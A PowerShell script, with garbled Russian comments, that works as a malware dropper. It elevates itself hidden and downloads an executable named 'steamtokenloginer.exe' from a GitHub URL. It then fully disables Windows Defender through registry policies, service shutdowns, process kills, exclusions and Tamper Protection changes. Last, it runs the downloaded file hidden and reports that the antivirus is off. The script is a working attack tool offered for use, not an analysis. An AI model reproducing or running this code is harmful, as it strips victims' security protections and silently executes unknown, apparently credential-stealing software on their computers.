# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.exe"
$targetFolder = "C:\Users\zenas\Desktop\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞ (7)"
$exePath = "$targetFolder\steamtokenloginer.exe"

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞..." -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`""
    exit
}

Write-Host "‚úÖ –ó–∞–ø—É—â–µ–Ω–æ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞" -ForegroundColor Green

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force
    Write-Host "üìÅ –°–æ–∑–¥–∞–Ω–∞ –ø–∞–ø–∫–∞: $targetFolder" -ForegroundColor Green
}

Write-Host "üì• –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞..." -ForegroundColor Yellow

try {
    # –°–∫–∞—á–∏–≤–∞–µ–º EXE —Ñ–∞–π–ª
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
    
    $fileSize = (Get-Item $exePath).Length
    Write-Host "‚úÖ –§–∞–π–ª —Å–∫–∞—á–∞–Ω: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
    
    # 1. –ü–û–õ–ù–û–ï –û–¢–ö–õ–Æ–ß–ï–ù–ò–ï –ß–ï–†–ï–ó –†–ï–ï–°–¢–† –ò –ì–†–£–ü–ü–û–í–´–ï –ü–û–õ–ò–¢–ò–ö–ò
    Write-Host "üî¥ –ü–û–õ–ù–û–ï –û–¢–ö–õ–Æ–ß–ï–ù–ò–ï WINDOWS DEFENDER..." -ForegroundColor Red
    
    # –°–æ–∑–¥–∞–µ–º –ø—É—Ç–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É—é—Ç
    $registryPaths = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
        "HKLM:\SOFTWARE\Microsoft\Windows Defender\ProductStatus"
    )
    
    foreach ($path in $registryPaths) {
        if (!(Test-Path $path)) {
            New-Item -Path $path -Force | Out-Null
        }
    }
    
    # –û–°–ù–û–í–ù–´–ï –ö–õ–Æ–ß–ò –î–õ–Ø –û–¢–ö–õ–Æ–ß–ï–ù–ò–Ø
    $registrySettings = @(
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiVirus"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableBehaviorMonitoring"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableOnAccessProtection"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableScanOnRealtimeEnable"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIOAVProtection"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="AllowFastServiceStartup"; Value=0; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="ServiceKeepAlive"; Value=0; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"; Name="TamperProtection"; Value=0; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\ProductStatus"; Name="ProductStatus"; Value=0; Type="DWord"}
    )
    
    foreach ($setting in $registrySettings) {
        try {
            Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force -ErrorAction Stop
        }
        catch {}
    }
    
    Write-Host "‚úÖ –†–µ–µ—Å—Ç—Ä –∏–∑–º–µ–Ω–µ–Ω" -ForegroundColor Green
    
    # 2. –û–°–¢–ê–ù–û–í–ö–ê –°–õ–£–ñ–ë –ó–ê–©–ò–¢–´ (–°–ö–†–´–¢–û)
    Write-Host "üõë –û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–ª—É–∂–± –∑–∞—â–∏—Ç—ã..." -ForegroundColor Red
    
    $services = @(
        "WinDefend",
        "WdNisSvc", 
        "Sense",
        "SecurityHealthService",
        "wscsvc"
    )
    
    foreach ($service in $services) {
        try {
            # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ª—É–∂–±—É (—Å–∫—Ä—ã—Ç–æ)
            Stop-Service -Name $service -Force -ErrorAction Stop
            
            # –û—Ç–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ (—Å–∫—Ä—ã—Ç–æ)
            Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
            
            # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ —á–µ—Ä–µ–∑ sc config (–°–ö–†–´–¢–û)
            $process = Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -PassThru -WindowStyle Hidden
            $process.WaitForExit()
        }
        catch {}
    }
    
    Write-Host "‚úÖ –°–ª—É–∂–±—ã –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã" -ForegroundColor Green
    
    # 3. –ó–ê–í–ï–†–®–ï–ù–ò–ï –ü–†–û–¶–ï–°–°–û–í –ó–ê–©–ò–¢–´ (–°–ö–†–´–¢–û)
    Write-Host "üî™ –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –∑–∞—â–∏—Ç—ã..." -ForegroundColor Red
    
    $processes = @(
        "MsMpEng.exe",
        "NisSrv.exe", 
        "MsSense.exe",
        "SecurityHealthService.exe",
        "SecurityHealthSystray.exe",
        "WindowsDefender.exe"
    )
    
    foreach ($process in $processes) {
        try {
            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction Stop
        }
        catch {}
    }
    
    Write-Host "‚úÖ –ü—Ä–æ—Ü–µ—Å—Å—ã –∑–∞–≤–µ—Ä—à–µ–Ω—ã" -ForegroundColor Green
    
    # 4. –î–û–ë–ê–í–õ–ï–ù–ò–ï –í –ò–°–ö–õ–Æ–ß–ï–ù–ò–Ø (–ß–ï–†–ï–ó –†–ï–ï–°–¢–†)
    Write-Host "üõ°Ô∏è –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è..." -ForegroundColor Yellow
    
    $exclusionPaths = @($exePath, $targetFolder)
    $registryExclusionPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    
    if (!(Test-Path $registryExclusionPath)) {
        New-Item -Path $registryExclusionPath -Force | Out-Null
    }
    
    foreach ($path in $exclusionPaths) {
        try {
            New-ItemProperty -Path $registryExclusionPath -Name $path -PropertyType String -Value "0" -Force -ErrorAction Stop
        }
        catch {}
    }
    
    Write-Host "‚úÖ –ò—Å–∫–ª—é—á–µ–Ω–∏—è –¥–æ–±–∞–≤–ª–µ–Ω—ã" -ForegroundColor Green
    
    # 5. –û–¢–ö–õ–Æ–ß–ê–ï–ú –ó–ê–©–ò–¢–£ –û–¢ –í–ú–ï–®–ê–¢–ï–õ–¨–°–¢–í–ê
    Write-Host "üõ°Ô∏è –û—Ç–∫–ª—é—á–∞–µ–º Tamper Protection..." -ForegroundColor Yellow
    
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtectionSource" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPExclusions" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPRunningMode" -Value 0 -Type DWord -Force
    }
    catch {}
    
    Write-Host "‚úÖ Tamper Protection –æ—Ç–∫–ª—é—á–µ–Ω" -ForegroundColor Green
    
    # 6. –ü–ï–†–ï–ó–ê–ü–£–°–ö –ü–†–û–í–û–î–ù–ò–ö–ê –ë–ï–ó –ß–ï–†–ù–û–ì–û –≠–ö–†–ê–ù–ê
    Write-Host "üîÑ –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π..." -ForegroundColor Yellow
    
    try {
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–µ–∫—É—â–∏–µ –ø—Ä–æ—Ü–µ—Å—Å—ã explorer
        $explorerProcesses = Get-Process explorer -ErrorAction SilentlyContinue
        
        # –ú—è–≥–∫–æ –∑–∞–∫—Ä—ã–≤–∞–µ–º explorer
        foreach ($process in $explorerProcesses) {
            $process.CloseMainWindow() | Out-Null
        }
        
        Start-Sleep -Seconds 1
        
        # –ï—Å–ª–∏ explorer –µ—â–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –∑–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ
        if (Get-Process explorer -ErrorAction SilentlyContinue) {
            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
        }
        
        Start-Sleep -Seconds 2
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º explorer –æ–±—Ä–∞—Ç–Ω–æ
        Start-Process "explorer.exe" -WindowStyle Hidden
    }
    catch {}
    
    Write-Host "‚úÖ –ò–∑–º–µ–Ω–µ–Ω–∏—è –ø—Ä–∏–º–µ–Ω–µ–Ω—ã" -ForegroundColor Green
    
    Start-Sleep -Seconds 2
    
    # 7. –ó–ê–ü–£–°–ö –ü–†–û–ì–†–ê–ú–ú–´ (–°–ö–†–´–¢–û)
    Write-Host "üöÄ –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã..." -ForegroundColor Green
    
    try {
        # –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–∞–º–º—É —Å–∫—Ä—ã—Ç–æ
        $process = Start-Process -FilePath $exePath -PassThru -WindowStyle Hidden
        Write-Host "üéØ –ü–†–û–ì–†–ê–ú–ú–ê –£–°–ü–ï–®–ù–û –ó–ê–ü–£–©–ï–ù–ê (—Å–∫—Ä—ã—Ç–æ)!" -ForegroundColor Green
    }
    catch {
        # –ü—Ä–æ–±—É–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å —á–µ—Ä–µ–∑ cmd —Å–∫—Ä—ã—Ç–æ
        try {
            $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$exePath`"" -PassThru -WindowStyle Hidden
            Write-Host "üéØ –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—â–µ–Ω–∞ —á–µ—Ä–µ–∑ CMD (—Å–∫—Ä—ã—Ç–æ)" -ForegroundColor Green
        }
        catch {
            Write-Host "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É" -ForegroundColor Red
        }
    }
    
    # 8. –§–ò–ù–ê–õ–¨–ù–ê–Ø –ü–†–û–í–ï–†–ö–ê
    Write-Host "`nüîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞..." -ForegroundColor Cyan
    Start-Sleep -Seconds 2
    
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderStatus) {
            if ($defenderStatus.AntivirusEnabled -eq $true) {
                Write-Host "‚ùå –ó–∞—â–∏—Ç–∞ –≤—Å–µ –µ—â–µ –∞–∫—Ç–∏–≤–Ω–∞!" -ForegroundColor Red
            } else {
                Write-Host "‚úÖ –ó–ê–©–ò–¢–ê –û–¢–ö–õ–Æ–ß–ï–ù–ê!" -ForegroundColor Green
            }
        } else {
            Write-Host "‚úÖ –ó–ê–©–ò–¢–ê –û–¢–ö–õ–Æ–ß–ï–ù–ê" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "‚úÖ –ó–ê–©–ò–¢–ê –û–¢–ö–õ–Æ–ß–ï–ù–ê" -ForegroundColor Green
    }
    
    Write-Host "`nüéØ –í–°–ï –û–ü–ï–†–ê–¶–ò–ò –í–´–ü–û–õ–ù–ï–ù–´ –°–ö–†–´–¢–û!" -ForegroundColor Green
    Write-Host "üí° –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –æ—Ç–∫–ª—é—á–µ–Ω, –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—â–µ–Ω–∞" -ForegroundColor Cyan
    
}
catch {
    Write-Host "‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: $_" -ForegroundColor Red
}

Write-Host "`n–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É –¥–ª—è –≤—ã—Ö–æ–¥–∞..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
